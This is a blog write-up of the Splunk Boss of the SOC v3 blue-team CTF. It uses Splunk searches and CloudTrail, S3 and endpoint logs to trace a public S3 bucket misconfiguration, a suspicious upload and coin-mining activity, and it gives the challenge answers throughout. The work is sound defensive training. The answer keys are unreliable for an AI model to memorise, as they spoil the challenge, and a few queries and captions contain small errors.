---
title: Boss of the SOC version 3 Write-ups
date: 2025-6-7 00:00:00 + 0700
categories: [siem, blue-teaming, soc, ctf-challenge]
tags: [splunk, bots, threat-hunting, log-analysis, write-ups]    
author: <author_id>   
description: Frothly Beer is moving their infrastructure to the cloud using a multi-cloud strategy. Let's help them detect suspicious activities while their business evolves significantly. 
# toc: false - uncomment to turn off Table of Contents which is use for display content in right-panel 
#comments: false # uncomment to turn on comment 
image: /assets/images/preview/botsv3.png
---
# Introduction

Hi Splunkers! Welcome back to my **Boss of the SOC (BOTS)** series on my blog.

If you haven’t read my previous [BOTSv1 Write-ups](https://phamthanhsang-cs.site/posts/BOTSV1/) and [BOTSv2 Write-ups](https://phamthanhsang-cs.site/posts/BOTSV2/) yet, I highly recommend checking them out first. They’ll give you a solid understanding of [Boss of the SOC - the Blue Team CTF Challenge created by Splunk](https://www.splunk.com/en_us/blog/security/what-you-need-to-know-about-boss-of-the-soc.html). I’d really appreciate it!


### About Boss of the SOC Version 3

**Boss of the SOC Version 3** is the latest publicly available BOTS CTF Challenge created by Splunk. In this version, we step into the shoes of **Alice Bluebird** - a quirky cybersecurity analyst to help organizations uncover the root causes of their digital chaos.

In the previous version (BOTSv2), we helped **Frothly**, a fictional craft beer company, detect hidden threats in their environment. From insiders using Tor to hide their activities, to external APTs attempting to exfiltrate intellectual property - it was intense.

Now, in BOTSv3, Frothly has grown rapidly and their traditional infrastructure can no longer keep up. As part of their technological evolution, they’ve migrated their environment to the cloud - utilizing both **AWS** and **Azure** for different business needs.

But as we know, for hackers, there’s nowhere to hide. As security analysts, it’s our job to help Frothly identify suspicious activity and trace the **root cause of digital chaos** in their expanded cloud infrastructure.

> **Fun Fact about my Boss of the SOC series:**  
> BOTSv3 was actually the **first version I completed**, even before versions 1 and 2!  
> It all started back in **April 2024**, with a Splunk instance running on a Linux VM inside my VirtualBox.  
> Revisiting this version now not only helps **refresh the knowledge** I’ve gained, but also sharpens the **analytical skills** I’ve developed since then.
{: .prompt-info }

# Environment Setup

- **Pre-requisites:**  
  Participating in **Boss of the SOC (BOTS)** is easier than ever thanks to its availability on various platforms:
  - [TryHackMe](https://tryhackme.com/)
  - [CyberDefenders](https://cyberdefenders.org/)

  Unfortunately, **Boss of the SOC v3** doesn’t appear on Splunk’s official website, but they have made the dataset [public on GitHub](https://github.com/splunk/botsv3) for anyone who wants to download it and give it a try.

  > *However, all walkthroughs in this guide are based on a **self-hosted setup**, including an approximation of what the CTF scoreboard looks like.*
  > *If you'd like to follow along or set up your own environment, check out this [detailed setup guide](https://phamthanhsang-cs.github.io/posts/BOTS-setup/) where we walk through everything step-by-step. Thanks!*

- **Dataset Information:**  
  Unlike BOTSv1 and BOTSv2, the third version only includes a **pre-indexed dataset** (~320MB), with a total of around **2 million events**.

  ![pic1](assets/images/botsv3/pic1.png)

# Walkthrough 
### Let's Splunking !
Same as both previous versions. before deep diving into answer BOTS questions, i would like to prepare some SPL searches to help us easier to hunting threats: 
- First is `|metadata index="botsv1" type=sourcetypes | stats values(sourcetype)`, the following SPL command helps me quickly identify the sourcetypes present in the dataset. This gives me a clear idea of the types of data we should focus on during investigation:
- The second one is `|metasearch index="botsv1" sourcetype=<specific_sourcetype> <keyword>`.
- The third one is `|fieldsummary` with [marcro](https://docs.splunk.com/Splexicon:Searchmacro) setup. My search will look like this:

```sql
| fieldsummary 
| fields field values value 
| rex field=values max_match=0 "\"value\":\"(?<value>[^\"]+)\""
| fields field value
```
*And i'd set this search with marcro named `spog` (single pane of glass), you will see why those searches helped me so much in this walkthrough.*

![pic2](assets/images/botsv3/pic2.png)
_WELCOME BACK TO MY BOSS OF THE SOC SERIES_

### Series 200

#### Question 1 (200): List out the IAM users that accessed an AWS service (successfully or unsuccessfully) in Frothly's AWS environment? Answer guidance: Comma separated without spaces, in alphabetical order. (Example: ajackson,mjones,tmiller)

> And like with the previous versions, I always recommend spending a little time to get a bird's-eye view of the `index` and its associated `sourcetypes` before jumping into the logs.  
> This will give you a better understanding of the data and where to begin your hunt.
>
> ```sql
> | metadata index=botsv3 type=sourcetypes 
> | stats values(sourcetype)
> ```
{: .prompt-info }


Before diving into the logs, it's important to understand a few foundational concepts and services in the world-leading cloud computing platform - **Amazon Web Services (AWS)**.

> I’m a big fan of F1 racing, and it’s fascinating that AWS is a key partner of the competition.  
> They provide a service called **F1® Insights**, transforming a traditional sport into a data-driven one. 

When discussing cloud computing, people often think of most common services like:

- **Compute** (e.g., EC2 for AWS, Azure Virtual Machines, OCI VMs for Oracle)
- **Storage** (e.g., AWS S3, Azure Blob Storage, Google Cloud Storage)
- **Serverless** (e.g., AWS Lambda, Azure Functions)

For this question, we're focusing on **Identity and Access Management (IAM)** - like **AWS IAM** or **Microsoft Entra ID** - to track which users accessed services.


**High-Level Overview of Relevant AWS Services:**

**Logging & Activity Tracking**
- **`aws:cloudtrail`**: Records API activity and management events.  
   *Primary service for auditing user activity (e.g., starting EC2 instances, creating S3 buckets).*

**Monitoring & Alerts**
- **`aws:cloudwatch`**: Monitors resources/applications, collects metrics, sets alarms, and builds dashboards.
- **`aws:cloudwatchlogs`**: Core log storage backend for services like EC2, Lambda, Route53.
- **`aws:cloudwatchlogs:vpcflow`**: Captures IP traffic to/from network interfaces in your **VPC** (Virtual Private Cloud).
- **`aws:cloudwatch:guardduty`**: Threat detection using ML to identify and alert on suspicious activity.

**Configuration & Compliance**
- **`aws:config:rule`**: Continuously checks resources against compliance rules (e.g., tagging, encryption, instance types).

**Storage & Access**
- **`aws:s3:accesslogs`**: Provides detailed records of requests to S3 buckets.

**Load Balancing**
- **`aws:elb:accesslogs`**: Tracks all traffic sent to Elastic Load Balancers (ELB).

**Relational Databases (RDS)**
- **`aws:rds:audit`**: Tracks database activities for engines like PostgreSQL, MySQL, Oracle.
- **`aws:rds:error`**: Logs engine errors for RDS services.

**Metadata**
- **`aws:description`**: Contains descriptive metadata about various AWS services (e.g., names, tags, IDs).

This understanding will help guide our log searches, especially focusing on **CloudTrail** and **CloudWatch** logs to identify IAM users and their interactions with AWS services.

The **CloudTrail** service records most user activity, and AWS provides detailed documentation about the fields used in these API tracking logs, which is extremely helpful.

[CloudTrail record contents for management, data, and network activity events](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference-record-contents.html)

![pic3](assets/images/botsv3/pic3.png)

This information gives us a clear idea of where to begin when analyzing the logs.

```sql
index=botsv3 sourcetype=aws:cloudtrail AND eventType=AwsConsoleSignIn
```

Only 4 events were returned. Below is an example of one of these logs:

```json
{
  "requestParameters": null,
  "additionalEventData": {
    "MobileVersion": "No",
    "MFAUsed": "No",
    "LoginTo": "https://console.aws.amazon.com/console/home?state=hashArgs%23&isauthcode=true"
  },
  "eventTime": "2018-08-20T15:04:44Z",
  "eventID": "6ae589cc-9b68-4a08-a3c2-c29c9cd59b9b",
  "eventVersion": "1.05",
  "awsRegion": "us-east-1",
  "eventType": "AwsConsoleSignIn",
  "eventSource": "signin.amazonaws.com",
  "userIdentity": {
    "principalId": "AIDAJUFKXZ44LV4EN4MGK",
    "arn": "arn:aws:iam::622676721278:user/bstoll",
    "type": "IAMUser",
    "userName": "bstoll",
    "accountId": "622676721278"
  },
  "eventName": "ConsoleLogin",
  "recipientAccountId": "622676721278",
  "responseElements": {
    "ConsoleLogin": "Success"
  },
  "sourceIPAddress": "107.77.212.175",
  "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
}
```

The `userIdentity` field contains useful information we can extract to identify all IAM users active in Frothly’s AWS environment:

```sql
index=botsv3 sourcetype=aws:cloudtrail | spath "userIdentity.type" | search "userIdentity.type"=IAMUser| spath "userIdentity.userName" 
|table userIdentity.userName userIdentity.type
|stats count by userIdentity.userName userIdentity.type
|sort - userIdentity.userName
```

![pic4](assets/images/botsv3/pic4.png)

There were four users identified: `bstoll,btun,splunk_access,web_admin`.

> ANSWER: `bstoll,btun,splunk_access,web_admin`
{: .prompt-info }

#### Question 2 (201): What field would you use to alert that AWS API activity have occurred without MFA (multi-factor authentication)? Answer guidance: Provide the full JSON path. (Example: iceCream.flavors.traditional)

This question isn’t just about filling in the blank with the correct answer - it’s more about understanding how to **optimize** the approach and **choose the right fields** to make your detection logic effective. In this case, we’ll gradually narrow down events in CloudTrail to find a useful field for alerting.

The idea is to gather as many **relevant** logs as possible - the more targeted and consistent the field, the more effective and noise-free your alert will be.

I will filter only for `eventType=AwsApiCall` and then run a bird’s eye view using the `spog` macro (or similar approach) to audit the fields. We’re specifically looking for fields that:
- Appear in the logs.
- Have 3 or fewer unique values (easy to evaluate conditions).
- Are related to **MFA** (multi-factor authentication).

```sql
index=botsv3 sourcetype=aws:cloudtrail eventType=AwsApiCall
|search *mfa*
|fieldsummary
|fields field values
|rex field=values max_match=0 "\"value\":\"(?<value>[^\"]+)\""
|mvexpand value
|stats dc(value) as value_count values(value) as values by field
|where value_count <= 3
```

![pic5](assets/images/botsv3/pic5.png)
_The search results would look like thiThe search results above show various fields; we're looking for those relevant to MFA with few value variations_

Among the results, a promising field appeared: `userIdentity.sessionContext.attributes.mfaAuthenticated` - This field consistently reflects whether an AWS API activity was authenticated using MFA.

![pic6](assets/images/botsv3/pic6.png)

Upon deeper inspection, this field is populated in various eventName and eventSource combinations, making it ideal for a wide coverage alert that detects AWS API activity without MFA.

![pic7](assets/images/botsv3/pic7.png)

> ANSWER: `userIdentity.sessionContext.attributes.mfaAuthenticated`
{: .prompt-info }

#### Question 3 (202): What is the processor number used on the web servers? Answer guidance: Include any special characters/punctuation. (Example: The processor number for Intel Core i7-8650U is i7-8650U.)

Going back to the `metadata` of sourcetypes, there was only one sourcetype relevant to this type of question: `hardware`. Querying this sourcetype returned only 3 events, all containing the same logs.

```sql
index=botsv2 sourcetype=hardware
```

![pic8](assets/images/botsv3/pic8.png)
_But is this really the correct answer ?_

To confirm, I looked up the host associated with the hardware logs: `gacrux.i-09cbc261e84259b54` - and checked if it was truly a web server.

```sql
|metasearch index=botsv3 sourcetype=* host="gacrux.i-09cbc261e84259b54"
|table sourcetype
|stats count by sourcetype
```

The result returned 45 sourcetypes, and among them was one that clearly indicated the host was a web server: `apache_error` (with 7 events).

Diving into that sourcetype confirmed the server was running Apache/2.2.34.

![pic9](assets/images/botsv3/pic9.png)

> ANSWER: E5-2676
{: .prompt-info }

#### Question 4 (203): Bud accidentally makes an S3 bucket publicly accessible. What is the event ID of the API call that enabled public access? Answer guidance: Include any special characters/punctuation.

This seems to mark the beginning of a serious security incident. It reminds me of a real case at my previous company, where an **AWS secret key** was accidentally exposed. A threat actor discovered it, gained access to our cloud environment, deployed crypto miners, and caused **significant financial loss.**

In this scenario, public access to an S3 bucket was likely the attacker's entry point into Frothly’s AWS environment.

In earlier questions, we saw that almost all services had **MFA disabled**. So I started by filtering CloudTrail logs for `eventSource=s3.amazonaws.com` where MFA was not used:

```sql
index=botsv3 sourcetype=aws:cloudtrail 
AND userIdentity.sessionContext.attributes.mfaAuthenticated=false AND eventSource=s3.amazonaws.com
```

![pic10](/assets/images/botsv3/pic10.png)

I got 15 unique eventName results. I then referred to [AWS S3 Documentation](https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html) which explained that S3 bucket permissions are controlled through ACLs. The `PutBucketAcl` API is used to change these permissions.

Only two events matched `PutBucketAcl`, so I focused on those:

```sql
index=botsv3 sourcetype=aws:cloudtrail 
AND userIdentity.sessionContext.attributes.mfaAuthenticated=false AND eventSource=s3.amazonaws.com AND eventName=PutBucketAcl
```

```json
{
  "eventTime": "2018-08-20T13:01:46Z",
  "eventName": "PutBucketAcl",
  "userIdentity": {
    "accountId": "622676721278",
    "userName": "bstoll",
    "arn": "arn:aws:iam::622676721278:user/bstoll",
    "sessionContext": {
      "attributes": {
        "mfaAuthenticated": "false",
        "creationDate": "2018-08-20T12:19:44Z"
      }
    },
    "type": "IAMUser",
    "invokedBy": "signin.amazonaws.com",
    "accessKeyId": "ASIAZB6TMXZ7OA2RDK5X",
    "principalId": "AIDAJUFKXZ44LV4EN4MGK"
  },
  "sourceIPAddress": "107.77.212.175",
  "eventSource": "s3.amazonaws.com",
  "eventVersion": "1.05",
  "requestID": "487488D003569438",
  "responseElements": null,
  "awsRegion": "us-west-1",
  "userAgent": "signin.amazonaws.com",
  "eventID": "ab45689d-69cd-41e7-8705-5350402cf7ac",
  "requestParameters": {
    "acl": [
      ""
    ],
    "AccessControlPolicy": {
      "AccessControlList": {
        "Grant": [
          {
            "Grantee": {
              "DisplayName": "bstoll",
              "ID": "4c018053e740f45beb45f68c0f5eff6347745488ae540130432c9fc64fae310d",
              "xmlns:xsi": "http://www.w3.org/2001/XMLSchema-instance",
              "xsi:type": "CanonicalUser"
            },
            "Permission": "FULL_CONTROL"
          },
          {
            "Grantee": {
              "URI": "http://acs.amazonaws.com/groups/s3/LogDelivery",
              "xmlns:xsi": "http://www.w3.org/2001/XMLSchema-instance",
              "xsi:type": "Group"
            },
            "Permission": "WRITE"
          },
          {
            "Grantee": {
              "URI": "http://acs.amazonaws.com/groups/s3/LogDelivery",
              "xmlns:xsi": "http://www.w3.org/2001/XMLSchema-instance",
              "xsi:type": "Group"
            },
            "Permission": "READ_ACP"
          },
          {
            "Grantee": {
              "URI": "http://acs.amazonaws.com/groups/s3/LogDelivery",
              "xmlns:xsi": "http://www.w3.org/2001/XMLSchema-instance",
              "xsi:type": "Group"
            },
            "Permission": "READ"
          },
          {
            "Grantee": {
              "DisplayName": "bstoll",
              "ID": "4c018053e740f45beb45f68c0f5eff6347745488ae540130432c9fc64fae310d",
              "xmlns:xsi": "http://www.w3.org/2001/XMLSchema-instance",
              "xsi:type": "CanonicalUser"
            },
            "Permission": "FULL_CONTROL"
          },
          {
            "Grantee": {
              "URI": "http://acs.amazonaws.com/groups/global/AllUsers",
              "xmlns:xsi": "http://www.w3.org/2001/XMLSchema-instance",
              "xsi:type": "Group"
            },
            "Permission": "READ"
          },
          {
            "Grantee": {
              "URI": "http://acs.amazonaws.com/groups/global/AllUsers",
              "xmlns:xsi": "http://www.w3.org/2001/XMLSchema-instance",
              "xsi:type": "Group"
            },
            "Permission": "WRITE"
          }
        ]
      },
      "Owner": {
        "DisplayName": "bstoll",
        "ID": "4c018053e740f45beb45f68c0f5eff6347745488ae540130432c9fc64fae310d"
      },
      "xmlns": "http://s3.amazonaws.com/doc/2006-03-01/"
    },
    "bucketName": "frothlywebcode"
  },
  "recipientAccountId": "622676721278",
  "eventType": "AwsApiCall"
}
```

Oh well ! Bud granted READ and WRITE access to `AllUsers`, meaning anyone on the internet could access this bucket:

```json
          {
            "Grantee": {
              "URI": "http://acs.amazonaws.com/groups/global/AllUsers",
              "xmlns:xsi": "http://www.w3.org/2001/XMLSchema-instance",
              "xsi:type": "Group"
            },
            "Permission": "READ"
          }
          {
            "Grantee": {
              "URI": "http://acs.amazonaws.com/groups/global/AllUsers",
              "xmlns:xsi": "http://www.w3.org/2001/XMLSchema-instance",
              "xsi:type": "Group"
            },
            "Permission": "WRITE"
          }
```

How about the second one ?

```json
{
  "eventTime": "2018-08-20T13:57:54Z",
  "eventName": "PutBucketAcl",
  "userIdentity": {
    "accountId": "622676721278",
    "userName": "bstoll",
    "arn": "arn:aws:iam::622676721278:user/bstoll",
    "sessionContext": {
      "attributes": {
        "mfaAuthenticated": "false",
        "creationDate": "2018-08-20T13:57:22Z"
      }
    },
    "type": "IAMUser",
    "invokedBy": "signin.amazonaws.com",
    "accessKeyId": "ASIAZB6TMXZ7FWTIS4NJ",
    "principalId": "AIDAJUFKXZ44LV4EN4MGK"
  },
  "sourceIPAddress": "107.77.212.175",
  "eventSource": "s3.amazonaws.com",
  "eventVersion": "1.05",
  "requestID": "6A18BDBBC85C6E81",
  "responseElements": null,
  "awsRegion": "us-west-1",
  "userAgent": "signin.amazonaws.com",
  "eventID": "9a33d8df-1e16-4d58-b36d-8e80ce68f8a3",
  "requestParameters": {
    "acl": [
      ""
    ],
    "AccessControlPolicy": {
      "AccessControlList": {
        "Grant": [
          {
            "Grantee": {
              "DisplayName": "bstoll",
              "ID": "4c018053e740f45beb45f68c0f5eff6347745488ae540130432c9fc64fae310d",
              "xmlns:xsi": "http://www.w3.org/2001/XMLSchema-instance",
              "xsi:type": "CanonicalUser"
            },
            "Permission": "FULL_CONTROL"
          },
          {
            "Grantee": {
              "URI": "http://acs.amazonaws.com/groups/s3/LogDelivery",
              "xmlns:xsi": "http://www.w3.org/2001/XMLSchema-instance",
              "xsi:type": "Group"
            },
            "Permission": "WRITE"
          },
          {
            "Grantee": {
              "URI": "http://acs.amazonaws.com/groups/s3/LogDelivery",
              "xmlns:xsi": "http://www.w3.org/2001/XMLSchema-instance",
              "xsi:type": "Group"
            },
            "Permission": "READ_ACP"
          },
          {
            "Grantee": {
              "URI": "http://acs.amazonaws.com/groups/s3/LogDelivery",
              "xmlns:xsi": "http://www.w3.org/2001/XMLSchema-instance",
              "xsi:type": "Group"
            },
            "Permission": "READ"
          },
          {
            "Grantee": {
              "DisplayName": "bstoll",
              "ID": "4c018053e740f45beb45f68c0f5eff6347745488ae540130432c9fc64fae310d",
              "xmlns:xsi": "http://www.w3.org/2001/XMLSchema-instance",
              "xsi:type": "CanonicalUser"
            },
            "Permission": "FULL_CONTROL"
          }
        ]
      },
      "Owner": {
        "DisplayName": "bstoll",
        "ID": "4c018053e740f45beb45f68c0f5eff6347745488ae540130432c9fc64fae310d"
      },
      "xmlns": "http://s3.amazonaws.com/doc/2006-03-01/"
    },
    "bucketName": "frothlywebcode"
  },
  "recipientAccountId": "622676721278",
  "eventType": "AwsApiCall"
}
```

In this second event, Bud appears to have tried fixing his mistake by removing public access and only assigning permissions to internal groups. Unfortunately, it was too late. There was a 56-minute window between the first and second event - more than enough time for an attacker to gain a foothold.

Worse still, the bucket in question was `frothlywebcode`, which could contain sensitive source code or configurations. An attacker could exploit this in unpredictable and damaging ways.

**Victim**
- `"bucketName": "frothlywebcode"`

**MITRE Tactics / Techniques**
- **Initial Access (TA0001)**
  - Valid Accounts: Cloud Accounts (T1078.004)

> ANSWER: `ab45689d-69cd-41e7-8705-5350402cf7ac`
{: .prompt-info }

#### Question 5 (204): What is the name of the S3 bucket that was made publicly accessible?

I won't explain anything in this following question ! We've seem like confirm the initial access vector from the adversary.

> ANSWER: frothlywebcode
{: .prompt-info }

#### Question 6 (205): What is the name of the text file that was successfully uploaded into the S3 bucket while it was publicly accessible? Answer guidance: Provide just the file name and extension, not the full path. (Example: filename.docx instead of /mylogs/web/filename.docx)

Now that we’ve built the timeline, let’s dive into some timeline analysis.

```sql
index=botsv3 sourcetype="aws:s3:accesslogs" earliest="08/20/2018:20:01:46" AND latest="08/20/2018:20:57:54" AND bucket_name=frothlywebcode
|reverse
```
After extracting some key fields, we can see a few interesting events logged in the frothlywebcode S3 bucket.

```sql
index=botsv3 sourcetype="aws:s3:accesslogs" earliest="08/20/2018:20:01:46" AND latest="08/20/2018:20:57:54" AND bucket_name=frothlywebcode
|reverse
|table _time remote_ip user_agent action http_method operation request_uri object_size
```

![pic11](assets/images/botsv3/pic11.png)

We already know that the IP `107.77.212.175` belongs to `bstoll` who was accidentally misconfiged Frothy's private bucket, so let’s focus on the other entries.

From the logs:
- IP `52.66.146.128` uploaded a text file named `OPEN_BUCKET_PLEASE_FIX.txt`
- IP `35.182.246.222` uploaded a zipped file named `frothly_html_memcached.tar.gz`, which is about 3 MB in size

After these uploads, we also see some enumeration activity in the logs:

![pic12](assets/images/botsv3/pic12.png)

Toward the end of the timeline, the IP that uploaded the zipped file (`35.182.246.222`) appears to enumerate the entire S3 bucket:

![pic13](assets/images/botsv3/pic13.png)

It looks like the text file `OPEN_BUCKET_PLEASE_FIX.txt` was uploaded as a warning to Frothly about their bucket being publicly accessible. On the other hand, the zipped file seems more suspicious and worth further investigation.

**Victim**
- `"bucketName": "frothlywebcode"`

**Possible Malicious contents**
- `52.66.146.128` 
- `35.182.246.222`
- `OPEN_BUCKET_PLEASE_FIX.txt`
- `frothly_html_memcached.tar.gz`


> ANSWER: `OPEN_BUCKET_PLEASE_FIX.txt`
{: .prompt-info}

#### Question 7 (206): What is the size (in megabytes) of the .tar.gz file that was successfully uploaded into the S3 bucket while it was publicly accessible? Answer guidance: Round to two decimal places without the unit of measure. Use 1024 for the byte conversion. Use a period (not a comma) as the radix character.

This question is straightforward, so we won’t go into too much detail here. We'll dig deeper into the threat actor’s TTPs in the next questions.

To calculate the size of the uploaded file, and based on previous question, we can use the following Splunk query, the key was using `round`:

```sql
index=botsv3 sourcetype="aws:s3:accesslogs" earliest="08/20/2018:20:01:46" latest="08/20/2018:20:57:54" bucket_name=frothlywebcode remote_ip!=107.77.212.175 AND http_method=PUT
|reverse
|eval object_size_MB=round(object_size/1024/1024, 2)
|table _time remote_ip user_agent action http_method operation request_uri object_size object_size_MB
```

![pic14](assets/images/botsv3/pic14.png)
_From the results, the file `frothly_html_memcached.tar.gz` had a size of 2.93 MB_

> ANSWER: `2.93`
{: .prompt-info}

#### Question 8 (208): A Frothly endpoint exhibits signs of coin mining activity. What is the name of the first process to reach 100 percent CPU processor utilization time from this activity on this endpoint? Answer guidance: Include any special characters/punctuation.

This question was more difficult to answer due to the small size and lack of contextual depth in the BOTSv3 dataset. Unlike BOTSv2's, even "attack-only" dataset has the size about 3.2 GB, correlating between multiple data sources here is more limited. Nevertheless, we’ll work with what’s available.

In the previous question, we identified several suspicious files (`OPEN_BUCKET_PLEASE_FIX.txt`, `frothly_html_memcached.tar.gz`) across multiple endpoints. To begin the investigation, I ran the following search:

```sql
index=botsv3 sourcetype=* AND sourcetype!=aws:s3:accesslogs AND earliest="08/20/2018:20:01:46" 
AND (*OPEN_BUCKET_PLEASE_FIX.txt* OR *frothly_html_memcached.tar.gz*)
|reverse
```
This search revealed six endpoints interacting with suspicious files:

- BSTOLL-L - Source types: `xmlwineventlog`, `wineventlog`
- `gacrux.i-09cbc261e84259b54` - Apache web server
- Two more similar EC2 instances - Source type: c`loud-init-output`
- `mars.i-08e52f8b5a034012d` - Source types: `osquery:results`, `bash_history`
- `console.us.code42.com` - Possibly Code42 security monitoring/assessment platform

![pic15](assets/images/botsv3/pic15.png)

Logs from Code42 clearly show BudStoll downloading and opening the file using `chrome.exe`:

```sql
index=botsv3 sourcetype=* AND sourcetype!=aws:s3:accesslogs AND earliest="08/20/2018:20:01:46" 
AND (*OPEN_BUCKET_PLEASE_FIX.txt* OR *frothly_html_memcached.tar.gz*)
AND host=console.us.code42.com:443
|reverse
```

```json
{
  "formattedTimestamp": "2018-08-20T14:04:12.962Z",
  "timestamp": 1534773852,
  "processName": "\\Device\\HarddiskVolume4\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
  "version": "1.0",
  "fileStats": {
    "uploadedBytes": null,
    "modifiedNum": null,
    "openedBytes": null,
    "openedNum": null,
    "downloadedBytes": 9229596,
    "downloadedNum": 3,
    "totalNum": 3,
    "addedBytes": null,
    "uploadedNum": null,
    "addedNum": null,
    "deletedNum": null,
    "deletedBytes": null,
    "totalBytes": 9229596,
    "modifiedBytes": null
  },
  "modular_input_consumption_time": "Mon, 20 Aug 2018 14:07:46 +0000",
  "userUid": "858527737266971219",
  "deviceRemoteAddress": "12.196.122.127",
  "eventType": "FILE_OPENED",
  "processOwner": "BudStoll",
  "eventUid": "2683198308419395342",
  "deviceGuid": "858528515276632730",
  "deviceAddress": "0.0.0.0",
  "files": [
    {
      "fileType": "FILE",
      "mimeType": "application/gzip",
      "lastModified": 1534773625695,
      "fileEventType": "DOWNLOAD",
      "restoreSuccessful": null,
      "md5": "218dd64994af34fdd8a96d99529ee30f",
      "length": 3076532,
      "fileName": "frothly_html_memcached.txt",
      "fullPath": "c:\\users\\budstoll\\downloads\\frothly_html_memcached.txt",
      "detectionTimestamp": 1534773633332
    },
    {
      "fileType": "FILE",
      "mimeType": "application/gzip",
      "lastModified": 1534773563726,
      "fileEventType": "DOWNLOAD",
      "restoreSuccessful": null,
      "md5": "218dd64994af34fdd8a96d99529ee30f",
      "length": 3076532,
      "fileName": "frothly_html_memcached.tar.gz",
      "fullPath": "c:\\users\\budstoll\\downloads\\frothly_html_memcached.tar.gz",
      "detectionTimestamp": 1534773565175
    },
    {
      "fileType": "FILE",
      "mimeType": "application/gzip",
      "lastModified": 1534773852391,
      "fileEventType": "DOWNLOAD",
      "restoreSuccessful": null,
      "md5": "218dd64994af34fdd8a96d99529ee30f",
      "length": 3076532,
      "fileName": "frothly_html_memcached.tar.gz",
      "fullPath": "c:\\users\\budstoll\\downloads\\frothly_html_memcached.tar.gz",
      "detectionTimestamp": 1534773853800
    }
  ]
}
```

This a strong indicator that BudStoll had downloaded file and opened it, actived process `chrome.exe`.

Next was those 3 Web Server, minimal events from these hosts. However, logs show downloads from s3://frothlywebcode, indicating this is part of Frothly’s internal CI/CD deployment infrastructure. The malicious file was also fetched during the setup, but there's no sign it was executed here.

```sql
index=botsv3 sourcetype=* AND sourcetype!=aws:s3:accesslogs AND earliest="08/20/2018:20:01:46" 
AND (*OPEN_BUCKET_PLEASE_FIX.txt* OR *frothly_html_memcached.tar.gz*)
AND host=gacrux.i*
```

```log
Complete!
Completed 4.2 KiB/4.2 KiB (11.8 KiB/s) with 1 file(s) remaining
download: s3://frothlyweb/configs/osquery.conf to ./osquery.conf
Completed 256.0 KiB/2.9 MiB (654.7 KiB/s) with 1 file(s) remaining
Completed 512.0 KiB/2.9 MiB (1.3 MiB/s) with 1 file(s) remaining  
Completed 768.0 KiB/2.9 MiB (1.9 MiB/s) with 1 file(s) remaining  
Completed 1.0 MiB/2.9 MiB (2.5 MiB/s) with 1 file(s) remaining    
Completed 1.2 MiB/2.9 MiB (3.1 MiB/s) with 1 file(s) remaining    
Completed 1.5 MiB/2.9 MiB (3.7 MiB/s) with 1 file(s) remaining    
Completed 1.8 MiB/2.9 MiB (4.2 MiB/s) with 1 file(s) remaining    
Completed 2.0 MiB/2.9 MiB (4.8 MiB/s) with 1 file(s) remaining    
Completed 2.2 MiB/2.9 MiB (5.3 MiB/s) with 1 file(s) remaining    
Completed 2.5 MiB/2.9 MiB (5.9 MiB/s) with 1 file(s) remaining    
Completed 2.8 MiB/2.9 MiB (6.5 MiB/s) with 1 file(s) remaining    
Completed 2.9 MiB/2.9 MiB (6.8 MiB/s) with 1 file(s) remaining    
download: s3://frothlywebcode/frothly_html_memcached.tar.gz to ./frothly_html_memcached.tar.gz
Completed 17.1 KiB/17.1 KiB (45.9 KiB/s) with 1 file(s) remaining
download: s3://frothlyweb/configs/http_conf.tar.gz to ./http_conf.tar.gz
Completed 3.6 KiB/3.6 KiB (4.2 KiB/s) with 1 file(s) remaining
download: s3://frothlyweb/configs/uf_deployment.sh to ./uf_deployment.sh
Completed 79 Bytes/79 Bytes (211 Bytes/s) with 1 file(s) remaining
download: s3://frothlyweb/configs/sysconfig_memcached to ./sysconfig_memcached
Completed 2.9 KiB/2.9 KiB (8.3 KiB/s) with 1 file(s) remaining
download: s3://frothlyweb/configs/config.php to ./config.php  
Completed 204.8 KiB/204.8 KiB (558.2 KiB/s) with 1 file(s) remaining
download: s3://frothlyweb/configs/Splunk_TA_nix.tgz to ./Splunk_TA_nix.tgz
Completed 119 Bytes/119 Bytes (361 Bytes/s) with 1 file(s) remaining
download: s3://frothlyweb/configs/process-monitoring.conf to ./process-monitoring.conf
accepting defaults
downloading splunkstreamfwd-7.1.2-157.linux64.tar.bz2 package from https://splunk.froth.ly/en-us/custom/splunk_app_stream/install_streamfwd/linux64 ..
```

Last but not least, the last host, the `bash_history` and `osquery:results` logs suggest this instance was used for scripting and automation, including uploading the file:.

```sql
index=botsv3 sourcetype=* AND sourcetype!=aws:s3:accesslogs AND earliest="08/20/2018:20:01:46" 
AND (*OPEN_BUCKET_PLEASE_FIX.txt* OR *frothly_html_memcached.tar.gz*)
AND host=mars.i-08e52f8b5a034012d
```

```bash
python /home/ec2-user/tools/s3-upload.py --bucket frothlywebcode --file frothly_web_memcaced.tar.gz --folder ‘’ --target frothly_html_memcached.tar.gz <---- Logs from bash_history
```

Despite limited indicators of compromise (IOCs) on BSTOLL-L, this endpoint is our strongest lead based on:
- The user (BudStoll) downloading and opening the file
- Associated Windows event logs being available

To detect coin mining activity, I focused on performance monitoring logs. Three relevant sourcetypes surfaced:
- top
- cpu
- PerfmonMk:Process

Out of these, `PerfmonMk:Process` is particularly important-it logs CPU usage per process and was only seen from `BSTOLL-L`.

Using `PerfmonMk:Process`, I looked for the first process that spiked to 100% CPU usage. After sorting the data chronologically, the first process to hit this threshold was revealed.

```sql
index=botsv3 sourcetype="PerfmonMk:Process" AND process_cpu_used_percent=100 AND earliest="08/20/2018:20:01:46"
|reverse
|table _time process_name ID_Process
```

![pic16](assets/images/botsv3/pic16.png)

A bunch of chrome processes reach 100% cpu usage, start with `chrome#5`

Trace back with the process id of 3400.

![pic17](assets/images/botsv3/pic17.png)

There were not much indicators that we could pull out from the sourcetypes. 

> ANSWER: `chrome#5`
{: .prompt-info }

#### Question 9 (209): When a Frothly web server EC2 instance is launched via auto scaling, it performs automated configuration tasks after the instance starts. How many packages and dependent packages are installed by the cloud initialization script? Answer guidance: Provide the number of installed packages then number of dependent packages, comma separated without spaces.

In earlier steps, we identified that three Frothly web servers were involved in deploying and possibly executing a suspicious payload (`frothly_html_memcached.tar.gz`). During startup, these EC2 instances run a cloud initialization script, which installs various packages necessary for the web server environment.

To find the exact number of installed packages, I reviewed the logs from the relevant cloud-init output. Here's a snippet of the relevant transaction summary:

```log
Dependencies Resolved
================================================================================
 Package            Arch   Version                    Repository           Size
================================================================================
Installing:
